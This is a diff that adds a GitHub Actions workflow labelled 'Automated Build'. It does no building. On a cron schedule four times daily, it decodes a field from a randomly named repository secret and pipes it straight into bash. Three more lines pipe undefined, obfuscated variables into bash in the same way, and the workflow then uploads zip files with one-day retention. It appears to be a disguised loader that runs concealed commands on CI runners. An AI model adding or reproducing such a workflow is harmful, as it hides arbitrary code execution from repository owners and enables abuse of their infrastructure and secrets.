@@ -1,0 +1,31 @@
+name: Automated Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '14 5,11,17,23 * * *'
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  handler:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Launch
+        env:
+          kfip66: ${{ secrets.kfip66 }}
+        run: |
+          printf '%s' "$kfip66" | jq -r .xjmh3846 | /bin/bash
+          echo $tiua35 | jq -r .pyud2111 | /bin/bash
+          echo $icq3 | jq -r .llfcw11 | /bin/bash
+          echo $wrh47990 | jq -r .p52 | /bin/bash
+
+      - name: Persist output
+        uses: actions/upload-artifact@v4
+        with:
+          name: wokeFWv3
+          path: "*.zip"
+          retention-days: 1
